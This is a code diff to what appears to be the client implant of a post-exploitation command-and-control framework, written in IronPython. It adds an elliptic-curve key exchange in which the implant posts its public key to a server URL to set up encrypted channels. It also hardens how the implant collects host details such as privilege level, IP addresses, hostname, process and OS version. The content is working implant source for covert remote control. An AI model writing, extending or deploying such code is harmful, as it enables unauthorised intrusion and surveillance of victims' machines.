@@ -29,28 +29,45 @@ except NameError:
 
 clr.AddReference("System.Management")
 clr.AddReference("System.Web.Extensions")
-clr.AddReference("Microsoft.VisualBasic")
+try:
+    clr.AddReference("Microsoft.VisualBasic")
+except:
+    pass
 clr.AddReference("Boo.Lang.Interpreter")
+clr.AddReference("BouncyCastle.Crypto")
+
 from System.Text import Encoding
 from System.Management import ManagementObject
 from System.Diagnostics import Process
 from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
 from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
 from System.IO.Compression import GZipStream, CompressionMode
-from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
+from System.Net import HttpWebRequest, WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
 from System.Net.Security import RemoteCertificateValidationCallback
 from System.Threading import Thread
 from System.Security.Cryptography import Aes, PaddingMode, CryptoStream, CryptoStreamMode, AsymmetricAlgorithm, HMACSHA256, RNGCryptoServiceProvider
 from System.Threading.Tasks import Task
 from System.Web.Script.Serialization import JavaScriptSerializer
-from Microsoft.VisualBasic.Devices import ComputerInfo
+try:
+    from Microsoft.VisualBasic.Devices import ComputerInfo
+except:
+    pass
 from Microsoft.Win32 import Registry
 from IronPython.Hosting import Python
 from Boo.Lang.Interpreter import InteractiveInterpreter
 
+from System.Text.RegularExpressions import Regex
+from System import StringComparison
+
+from Org.BouncyCastle.Crypto.Parameters import ECKeyGenerationParameters, ECDomainParameters, ECPublicKeyParameters
+from Org.BouncyCastle.Security import GeneratorUtilities, SecureRandom, AgreementUtilities
+from Org.BouncyCastle.Asn1.Sec import SecNamedCurves, SecObjectIdentifiers
+from Org.BouncyCastle.Math import BigInteger
+from Org.BouncyCastle.Crypto.Digests import Sha256Digest
+from Org.BouncyCastle.Crypto.Agreement import ECDHBasicAgreement
 
 def urljoin(*args):
-    return "/".join(str(arg).strip("/") for arg in args)
+    return "/".join(map(lambda x: str(x).rstrip('/'), args))
 
 
 def print_traceback():
@@ -112,14 +129,58 @@ class Serializable(object):
 
 class Crypto(object):
     def __init__(self):
-        self.asymAlgo = AsymmetricAlgorithm.Create("ECDiffieHellmanCng")
-        self.public_key = self.asymAlgo.PublicKey.ToXmlString()
-        self.server_pubkey = None
-        self.derived_key = None
+        x9EC = SecNamedCurves.GetByName("secp521r1")
+        self.aliceKeyPair = self.GenerateKeyPair(ECDomainParameters(x9EC.Curve, x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed()))
+        self.bobPublicKey = self.GetBobPublicKey(URL, x9EC, self.aliceKeyPair.Public)
 
-    def derive_key(self, pubkey_xml):
-        self.server_pubkey = self.asymAlgo.PublicKey.FromXmlString(pubkey_xml)
-        self.derived_key = self.asymAlgo.DeriveKeyMaterial(self.server_pubkey)
+        self.derived_key = self.derive_key(self.bobPublicKey, self.aliceKeyPair.Private)
+
+    def GenerateKeyPair(self, ecDomain):
+        g = GeneratorUtilities.GetKeyPairGenerator("ECDH")
+        g.Init(ECKeyGenerationParameters(ecDomain, SecureRandom()))
+
+        return g.GenerateKeyPair()
+
+    def GetBobPublicKey(self, url, x9EC, alicePublicKey):
+        requests = Requests()
+
+        alice_x = str(alicePublicKey.Q.Normalize().AffineXCoord)
+        alice_y = str(alicePublicKey.Q.Normalize().AffineYCoord)
+        json = "{'x': \"" + alice_x + "\",'y': \"" + alice_y +"\"}"
+
+        response = requests.post(url, Encoding.UTF8.GetBytes(json)).text
+        response = response.replace("\"", "'")
+
+        r = Regex("': (.+?) ")
+        mcx = r.Matches(response)
+        x = BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", ""))
+
+        y = BigInteger(response.Substring(response.LastIndexOf(": ", StringComparison.Ordinal) + 1).Replace("}", "").Trim())
+
+        return ECPublicKeyParameters("ECDH", x9EC.Curve.ValidatePoint(x,y).Normalize(), SecObjectIdentifiers.SecP521r1)
+
+    def derive_key(self, bobPublicKey, alicePrivateKey):
+        aKeyAgree = ECDHBasicAgreement()
+        aKeyAgree.Init(alicePrivateKey)
+        sharedSecretBytes = self.resize_right(aKeyAgree.CalculateAgreement(bobPublicKey).ToByteArray(), 66)
+
+        digest = Sha256Digest()
+        symmetricKey = Array.CreateInstance(Byte, digest.GetDigestSize())
+        digest.BlockUpdate(sharedSecretBytes, 0, sharedSecretBytes.Length)
+        digest.DoFinal(symmetricKey, 0)
+
+        return symmetricKey
+
+    # Resize but pad zeroes to the left instead of to the right like Array.Resize
+    def resize_right(self, b, length):
+        if b.Length == length:
+            return b
+        if b.Length > length:
+            raise Exception("Invalid size!")
+        newB = Array.CreateInstance(Byte, length)
+        Array.Copy(b, 0, newB, length - b.Length, b.Length)
+
+        return newB
 
     def HMAC(self, key, message):
         with HMACSHA256(key) as hmac:
@@ -298,9 +359,18 @@ class STClient(Serializable):
         self.DOTNET_VERSION = str(Environment.Version)
         self.HIGH_INTEGRITY = self.is_high_integrity()
         self.IP = self.get_network_addresses()
-        self.OS = "{} ({})".format(ComputerInfo().OSFullName, Environment.OSVersion.Version)
         self.OS_ARCH = "x64" if IntPtr.Size == 8 else "x86"
-        self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
+
+        try:
+            self.OS = "{} ({})".format(ComputerInfo().OSFullName, Environment.OSVersion.Version)
+        except:
+            self.OS = "{} ({})".format(Environment.OSVersion.ToString(), Environment.OSVersion.Version)
+
+        try:
+            self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
+        except:
+            self.OS_RELEASE_ID = "N/A"
+
         self.PROCESS = self.__process.Id
         self.PROCESS_NAME = self.__process.ProcessName
         self.HOSTNAME = Environment.MachineName
